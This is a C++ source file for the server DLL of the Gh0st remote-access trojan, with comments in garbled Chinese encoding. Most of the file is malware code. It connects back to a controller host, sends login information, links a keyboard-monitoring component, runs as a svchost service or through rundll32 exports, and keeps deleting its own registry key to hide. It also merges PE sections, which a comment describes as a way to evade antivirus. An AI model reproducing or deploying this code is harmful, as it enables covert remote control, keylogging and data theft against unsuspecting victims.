// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/KernelManager.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")



// �ϲ�����
#pragma comment(linker, "/MERGE:.rdata=.data")//��rdata���κϲ���data������
//#pragma comment(linker, "/MERGE:.text=.data")//��text���κϲ���data������
#pragma comment(linker, "/MERGE:.reloc=.data")//��reloc���κϲ���data������

#pragma code_seg("PAGE") //����PAGE�����ε�����
//�������ɱ�������õ�һ��������ѡ������԰�cpp�ļ���Ĵ���ŵ�һ������������������ڶԸ�ɱ������Ĵ����ɱ��ʱ�򣬸����Ǵ����˷ǳ���ķ���



char g_strSvchostName[MAX_PATH];
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;
char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

enum
{
	NOT_CONNECT, //  ��û������
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};

struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
}g_myAddress={0x1234567,"",0};

DWORD WINAPI main(char *lpServiceName);

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// �����쳣�����´�������
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
DWORD WINAPI main(char *lpServiceName)
{
   char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	strcpy(g_strHost,g_myAddress.strIP);
	g_dwPort=g_myAddress.nPort;
	//--������ͬ���ڽ���
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
	
     //--�����ж�CKeyboardManager::g_hInstance�Ƿ�Ϊ�� �����Ϊ������������
	 //--����Ҫ��dllmain��ΪCKeyboardManager::g_hInstance��ֵ
	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);  //������Ǵ�����Ļص�������
		
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // ����¼���

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		//ReConfigService(strServiceName);   //--lang--
		// ɾ����װ�ļ�
	//	DeleteInstallFile(lpServiceName);     //--lang--
	}
	// ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;
    
	//---����������һ�� CClientSocket��
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	//--�����ж��Ƿ����ӳɹ�������ɹ����������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();      
					CloseHandle(hEvent);
					break;
					break;
					
				}
				// ��һ��
				Sleep(60);
			}
		}
       //���ߵ�ַ
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---����Connect���������ض˷�������
		OutputDebugString(lpszHost);
 		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---���Ӵ�����������ѭ��
			continue;
		}
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		//---ע���������ӳɹ���������һ��CKernelManager ��CKernelManager��鿴һ��
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// ����Ҫ�ָ�׿�棬��Ϊ����Ǹ��·���˵Ļ����·���������У��˽��ָ̻�����׿�棬���������
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);

}

extern "C" __declspec(dllexport) void TestRun(char* strHost,int nPort )
{
	strcpy(g_myAddress.strIP,strHost);  //�������ߵ�ַ
	g_myAddress.nPort=nPort;             //�������߶˿�
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//����ȴ��߳̽���
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);     
}
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		//CKeyboardManager::Initialization();
		break;
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}


extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }else FreeConsole();
	
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
    // call Real Service function noew
	
	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	if (g_dwServiceType == 0x120)
	{
		//Shared�ķ��� ServiceMain ���˳�����ȻһЩϵͳ��svchost����Ҳ���˳�
		while (1) Sleep(10000);
	}
    return;
}

DWORD WINAPI DelAXRegThread(LPVOID lpParam)
{
	char strFileName[MAX_PATH];     //dll�ļ���
	char *pstrTemp=NULL;
	char ActiveXStr[1024];           //activex ��ֵ�ַ���
	
	ZeroMemory(ActiveXStr,1024);
	ZeroMemory(strFileName,MAX_PATH);
	//�õ������ļ���
	GetModuleFileName(CKeyboardManager::g_hInstance,strFileName,MAX_PATH);
	PathStripPath(strFileName); //�������ļ���ת��Ϊ�ļ���
    pstrTemp=strstr(strFileName,".dll");  //Ѱ�� .dllȻ����ɾ����
	if (pstrTemp!=NULL)
	{
		ZeroMemory(pstrTemp,strlen(pstrTemp));  //ɾ������չ��
		//�����ֵ
		sprintf(ActiveXStr,"%s%s","Software\\Microsoft\\Active Setup\\Installed Components\\",strFileName);
		while(1)
		{
			//��ͣ��ɾ��ע���
			RegDeleteKey(HKEY_CURRENT_USER,ActiveXStr); 
			OutputDebugString(ActiveXStr);      //���ɾ�����ִ����Բ���
			Sleep(1000*30);
		}
	}
	return 0;
	
}

extern "C" __declspec(dllexport) void MainRun(HWND hwnd,HINSTANCE hinst,LPSTR lpCmdLine,int nCmdShow)
{
	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

extern "C" __declspec(dllexport) void FirstRun(HWND hwnd,HINSTANCE hinst,LPSTR lpCmdLine,int nCmdShow)
{
    char strMyFileName[MAX_PATH],strCmdLine[MAX_PATH];
	ZeroMemory(strMyFileName,MAX_PATH);
	ZeroMemory(strCmdLine,MAX_PATH);
   //�õ������ļ���
	GetModuleFileName(CKeyboardManager::g_hInstance,strMyFileName,MAX_PATH);
    //������������
	sprintf(strCmdLine,"%s %s,MainRun","rundll32.exe",strMyFileName);
	
	//���������
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb=sizeof(STARTUPINFO);
	StartInfo.lpDesktop=NULL;
	StartInfo.lpReserved=NULL;
	StartInfo.lpTitle=NULL;
	StartInfo.dwFlags=STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2=0;
	StartInfo.lpReserved2=NULL;
	StartInfo.wShowWindow=SW_SHOWNORMAL;
	BOOL bReturn=CreateProcess(NULL,strCmdLine,NULL,NULL,FALSE,NULL,NULL,NULL,&StartInfo,&ProcessInformation);
	
}

